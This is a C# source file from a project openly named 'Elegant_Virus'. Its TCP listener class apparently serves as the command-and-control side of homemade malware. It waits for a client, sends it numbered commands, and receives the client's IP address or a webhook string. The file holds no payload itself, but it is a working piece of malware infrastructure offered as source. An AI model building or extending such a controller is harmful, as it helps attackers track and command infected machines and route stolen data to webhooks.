using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace Elegant_Virus
{
    internal class server : MainWindow
    {
        public string IP { get; set; }
        public bool Connected { get; set; }
        public string webhock { get; set; }
        IPAddress _ip;
            int _port;
            int _status;
            string _msg;
            public server(IPAddress ip, int port, int status, string msg = "test")
            {
                this._ip = ip;
                this._port = port;
                this._status = status;
                _msg = msg;
            }
            public  void sendrequst()

            {
                TcpListener listener = new TcpListener(this._ip, this._port);
                listener.Start();
                while (true)
                {
                    Console.WriteLine("wait for connection ");
                    TcpClient client = listener.AcceptTcpClient();
                    Console.WriteLine($"connected!");
                    var clientsream = client.GetStream();
                    NetworkStream stream = clientsream;
                    StreamReader sr = new StreamReader(clientsream);
                    StreamWriter sw = new StreamWriter(clientsream);
                    try
                    {
                        byte[] buffer = new byte[1024];
                        stream.Read(buffer, 0, buffer.Length);
                        int recv = 0;
                        foreach (byte b in buffer)
                        {
                            if (b != 0)
                            {
                                recv++;
                            }
                        }
                        string requst = Encoding.UTF8.GetString(buffer, 0, recv);
                        var status = this._status;
                    if (status == 1)
                    {
                        sw.WriteLine("1");
                        sw.Flush();
                        var a = sr.ReadLine();
                        IP = a;

                        Connected = true;


                        listener.Stop();


                        break;
                    }
                    else if (status == 2)
                    {
                        sw.WriteLine("2");
                        sw.Flush();
                        listener.Stop();

                        break;

                    }
                    else if (status == 3)
                    {
                        webhock = this._msg;
                        sw.WriteLine($"3`{webhock}");
                        sw.Flush();

                        var webhockrepo = sr.ReadLine();

                        webhock = webhockrepo;
                        listener.Stop();

                        break;

                    }
                    else if (status == 4)
                    {
                        sw.WriteLine($"4`{this._msg}");
                        sw.Flush();

                        var webhockrepo = sr.ReadLine();

                        listener.Stop();

                        break;
                    }
                    else
                    {
                        listener.Stop();
                        break;

                    }


                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
            }

        }
    
}
